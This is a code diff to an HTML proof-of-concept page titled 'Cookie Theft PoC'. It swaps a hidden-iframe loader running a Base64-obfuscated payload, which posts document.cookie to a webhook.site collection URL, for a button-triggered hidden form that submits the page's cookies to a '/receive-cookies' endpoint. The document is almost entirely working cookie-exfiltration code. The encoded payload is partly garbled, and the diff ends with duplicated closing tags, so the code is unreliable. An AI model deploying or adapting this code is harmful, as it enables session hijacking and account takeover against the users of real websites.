@@ -17,45 +17,31 @@
 </head>
 <body>
     <h1>Cookie Theft PoC</h1>
+    <button class="test-button" onclick="triggerAttack()">Steal Cookies</button>
 
     <script>
         function triggerAttack() {
-            // Replace this with your new Base64 encoded payload
-            var encodedPayload = 'dmFyIGZpc2NoID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpOwpmaXNjaC5tZXRob2QgPSAnUE9TVCc7CmZpc2NoLmFjdGlvbiA9ICdodHRwczovL3dlYmhvb2suc2l0ZS84Y2ZmZjNhYS0zM2E3LTQ0ZDMtOWRlMS04NmZkMjliMDk2N2IvcmVjZWl2ZS1jb29raWVzJzsKdmFyIGlucHV0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaW5wdXQnKTsKaW5wdXQudHlwZSA9ICdoaWRkZW4nOwppbnB1dC5uYW1lID0gJ2Nvb2tpZURhdGFnJzsKaW5wdXQudmFsdWUgPSBkb2N1bWVudC5jb29raWUvcmVjdGVuYWJsZQpmc2NoLmFwcGVuZENoaWxkKGZpc2NoKTsKZmlzY2guYXBwZW5kQ2hpbGQoKTsK';
-
-            // Decode the Base64 encoded payload
-            var decodedPayload = atob(encodedPayload);
-
-            // Create an iframe element
-            var iframe = document.createElement('iframe');
-            iframe.style.display = 'none'; // Hide the iframe from view
-            document.body.appendChild(iframe);
-
-            // Wait for the iframe to load before writing to it
-            iframe.onload = function() {
-                var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-
-                if (iframeDoc) {
-                    iframeDoc.open();
-                    iframeDoc.write('<script>' + decodedPayload + '</script>');
-                    iframeDoc.close();
-                } else {
-                    console.error('Failed to access iframe document');
-                }
-            };
+            // Create a hidden form
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = '/receive-cookies'; // Endpoint on the same origin or a subdomain
+            
+            // Create a hidden input to store cookies
+            var input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = 'cookies';
+            input.value = document.cookie;
+            
+            form.appendChild(input);
+            document.body.appendChild(form);
+            
+            // Submit the form
+            form.submit();
         }
-
-        // Create the button element
-        var button = document.createElement('button');
-        button.className = 'test-button';
-        button.textContent = 'Steal Cookies';
-        button.onclick = triggerAttack;
-
-        // Append the button to the body
-        document.body.appendChild(button);
     </script>
 </body>
 </html>
+
     </script>
 </body>
 </html>
